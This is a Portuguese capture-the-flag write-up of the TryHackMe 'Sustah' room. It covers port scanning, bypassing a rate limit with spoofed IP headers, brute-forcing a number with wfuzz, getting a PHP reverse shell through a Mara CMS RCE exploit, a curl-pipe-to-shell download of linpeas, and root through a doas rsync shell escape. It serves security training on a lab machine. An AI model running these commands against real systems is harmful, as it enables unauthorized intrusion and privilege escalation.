> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/sustah.md).

# Sustah

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FMXZLhFAxmtAg8PWHxuop%2Fimage.png?alt=media&amp;token=fb193cf6-6c49-49de-bbd3-ccccb99292a5" alt="" width="375"><figcaption></figcaption></figure>

{% embed url="<https://tryhackme.com/r/room/sustah>" %}

**Classificação** : Medium

**Criador** : [Kiransau](https://tryhackme.com/p/kiransau)

**Ferramentas** : Rustscan, nmap, Burpsuite, wfuzz e linpeas

### Enumeração

Varredura de porta com o rustscan

```shell-session
$ rustscan -a $ip -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.99.164:22
Open 10.10.99.164:80
Open 10.10.99.164:8085

```

Digitalização detalhada com o nmap

```shell-session
$ sudo nmap -sC -sV -p22,80,8085 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 18:02 EDT
Nmap scan report for 10.10.99.164
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Susta
|_http-server-header: Apache/2.4.18 (Ubuntu)
8085/tcp open  http    Gunicorn 20.0.4
|_http-title: Spinner
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Existem três portas abertas :&#x20;

* 22 (ssh)
* 80 (http)
* 8085 (http)

A porta 80 não revela nenhuma informação pertinente, então começamos por verificar a porta 8085

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FR0vkGyO8kNtFwNVJ15yo%2FCaptura%20de%20ecra%CC%83%202024-05-24%2C%20a%CC%80s%2019.17.04.png?alt=media&amp;token=04f4ff23-4e66-41a9-8595-c477c251c027" alt=""><figcaption></figcaption></figure>

Adivinhar um número? Com chance de 0.004% ? Esse comentário diz claramente que não há chance de adivinhar um número, mas ainda assim vamos tentar adivinhar um número e analisar as requisições com o burpsuite.

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FGTjzTPRxEaxD3ppmWQKe%2F1.png?alt=media&amp;token=c457aca0-ae5d-4d58-abc1-67f45edad56c" alt=""><figcaption></figcaption></figure>

Não podemos adivinhar o número certo por brute force, pois há limitação de taxa no formulário.

Com uma pesquisa extra é possível bypassar a taxa de limitação usando cabeçalhos personalizados :&#x20;

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

`X-Remote-Addr: 127.0.0.1` é a nossa solução para fazer um bypass na taxa de limitação

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FltSE1Lttw9oLtSth23Pa%2F1.png?alt=media&amp;token=c5f2fa78-12e2-4c48-ae85-782522d96d7c" alt=""><figcaption></figcaption></figure>

Com todas essas informações executei um script python para gerar números de 5 dígitos

```python
python3 -c 'for i in range(10000,100000): print (i); ' > numbers.txt
```

Força bruta do número com o wfuzz

```shell-session
$ wfuzz -w numbers.txt --hh 1004 -c -H 'X-Remote-Addr: 127.0.0.1' -d 'number=FUZZ' -u http://10.10.99.164:8085/ 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.99.164:8085/
Total requests: 90000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000000922:   200        38 L     73 W       975 Ch      "10921"  
```

Obtemos o número `10921` , vamos analisar esta resposta com o burpsuite

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F9i5jDoDpzKQAkMh1z4vP%2F1.png?alt=media&amp;token=12b4ac00-2b1d-4522-b92b-04bcb2929976" alt=""><figcaption></figcaption></figure>

E obtemos um caminho para o diretório oculto

### CMS

Voltamos a porta 80 com o caminho encontrado, e com isso encontramos a aplicação

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FbaPwveCpr28pLllQ8x4J%2FCaptura%20de%20ecra%CC%83%202024-05-24%2C%20a%CC%80s%2020.11.38.png?alt=media&amp;token=e27c4649-a4ba-4bba-be36-7a3d4b1966dc" alt=""><figcaption></figcaption></figure>

Procuramos  por um exploit da versão do cms `Mara cms 7.5`  [authenticated rce exploit](https://www.exploit-db.com/exploits/48780?ref=unhackable.lol)

As credenciais são encontradas quando navegamos até a página de teste

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2Ff3eaB0r5kILcptPeZka1%2FCaptura%20de%20ecra%CC%83%202024-05-24%2C%20a%CC%80s%2020.27.58.png?alt=media&amp;token=3f4051c9-fa00-4a6c-a5c8-c10e180666a8" alt=""><figcaption></figcaption></figure>

### Exploração

Após o login, criamos uma nova página e carregamos um shell php, e recebemos um shell reverso

```shell-session
$ nc -nvlp 900
listening on [any] 900 ...
connect to [10.9.225.130] from (UNKNOWN) [10.10.99.164] 53754
Linux ubuntu-xenial 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:48:36 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Escalação de privilégios

Download do `linpeas`&#x20;

```shell-session
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

Enviar para o alvo

```shell-session
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

A saída do linpeas revela um arquivo contendo a password do usuário  kiran

```
$ cat .bak.passwd | grep -i password
kiran:x:1002:1002:<REDACTED>:/home/kiran:
```

Com as credencias encontradas fizemos login e atualizamos o shell

```shell-session
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ export TERM=xterm
$ su kiran
su kiran
Password: <REDACTED>                

kiran@ubuntu-xenial:/$ 

```

Executando novamente o linpeas, encotramos o `doas` que é um comando que permite que um usuário execute um comando com se fosse outro usuário

```
╔══════════╣ Useful software
/usr/bin/base64                                                                                                              
/usr/bin/curl
/usr/local/bin/doas <---
```

O linpeas também revela que o rsync pode ser executado como root, portanto pesquisamos no [gtfobins](https://gtfobins.github.io/gtfobins/rsync/?ref=unhackable.lol#sudo) e encontramos o comando que nos permite fazer root

```shell-session
kiran@ubuntu-xenial:~$ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# 

```
